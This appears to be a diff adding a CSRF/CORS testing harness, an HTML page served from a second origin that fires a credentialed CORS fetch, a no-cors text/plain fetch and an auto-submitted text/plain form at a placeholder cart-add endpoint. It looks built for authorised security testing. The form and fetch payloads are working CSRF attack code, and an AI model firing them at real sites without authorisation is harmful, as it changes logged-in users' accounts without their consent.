@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<!--
+  Attacker-origin CSRF/CORS proof harness.
+
+  Serve this from a DIFFERENT origin than the target (any local port works):
+      cd <dir with this file> && python -m http.server 8897 --bind 127.0.0.1
+  then point the engagement browser at http://127.0.0.1:8897/attacker-origin-harness.html
+
+  Before trusting the result, curl the URL and confirm the title — another agent/session on the
+  same machine can already own the port and you would be testing THEIR page.
+
+  Fill in TARGET_URL / BODY, then read the <pre id="log"> output. Three vectors are fired, in the
+  order that matters for a real CSRF verdict:
+
+    1. cross-origin fetch, credentials, content-type application/json
+         -> "BLOCKED (TypeError: Failed to fetch)" means the CORS preflight was refused, so the
+            JSON route is NOT reachable from an attacker page. If it returns a status, the
+            response headers (ACAO / ACA-Credentials) decide whether it is a CORS finding.
+    2. cross-origin fetch, mode:'no-cors', content-type text/plain
+         -> a CORS-simple request, sent without a preflight; response is opaque. If the app
+            accepts text/plain with a JSON body, THIS is the CSRF path. If the app answers 400
+            for that content type (verify same-origin first), the no-preflight route is closed.
+    3. auto-submitted <form enctype="text/plain"> (the classic no-preflight vector).
+
+  Verify impact by reading state FROM THE TARGET ORIGIN before and after (cart quantity, item
+  list, profile field). "No change" + a mechanism explaining why = a complete, defensible
+  negative. Cookie policy matters too: read the session cookie over CDP Network.getAllCookies —
+  SameSite=None + Secure means the browser WILL attach it cross-site; Lax/Strict kills CSRF
+  outright (Chrome treats an unset SameSite as Lax).
+-->
+<html>
+<head><meta charset="utf-8"><title>attacker origin harness</title></head>
+<body>
+<h1 id="h">running…</h1>
+<pre id="log"></pre>
+
+<!-- vector 3: form POST with a simple content type -->
+<form id="f" method="POST" action="TARGET_URL" enctype="text/plain" target="sink">
+  <input name='{"productCode":"CHANGEME","quantity":1,"ignore":"' value='"}'>
+</form>
+<iframe name="sink" style="display:none"></iframe>
+
+<script>
+const TARGET_URL = "TARGET_URL";          // e.g. https://www.example.com/uir-pdp/api/cart/add
+const BODY = JSON.stringify({productCode: "CHANGEME", quantity: 1});
+const log = (s) => { document.getElementById('log').textContent += s + "\n"; };
+
+async function vector1_corsJson() {
+  try {
+    const r = await fetch(TARGET_URL, {
+      method: "POST", mode: "cors", credentials: "include",
+      headers: {"content-type": "application/json"}, body: BODY
+    });
+    let t = ""; try { t = (await r.text()).slice(0, 160); } catch (e) { t = "<unreadable>"; }
+    log("1 CORS/JSON  -> status=" + r.status +
+        " acao=" + r.headers.get("access-control-allow-origin") +
+        " acac=" + r.headers.get("access-control-allow-credentials") +
+        " body=" + t);
+  } catch (e) {
+    log("1 CORS/JSON  -> BLOCKED " + String(e).slice(0, 120));   // preflight refused = route closed
+  }
+}
+
+async function vector2_nocorsTextPlain() {
+  try {
+    const r = await fetch(TARGET_URL, {
+      method: "POST", mode: "no-cors", credentials: "include",
+      headers: {"content-type": "text/plain"}, body: BODY
+    });
+    log("2 no-cors text/plain -> SENT (opaque, type=" + r.type + ") — check target state to see if it took effect");
+  } catch (e) {
+    log("2 no-cors text/plain -> BLOCKED " + String(e).slice(0, 120));
+  }
+}
+
+function vector3_formPost() {
+  document.getElementById('f').submit();
+  log("3 form enctype=text/plain -> submitted");
+}
+
+(async () => {
+  await vector1_corsJson();
+  await vector2_nocorsTextPlain();
+  vector3_formPost();
+  setTimeout(() => {
+    log("done — now read state from the TARGET origin and compare with the baseline");
+    document.getElementById('h').textContent = "DONE";
+  }, 3000);
+})();
+</script>
+</body>
+</html>
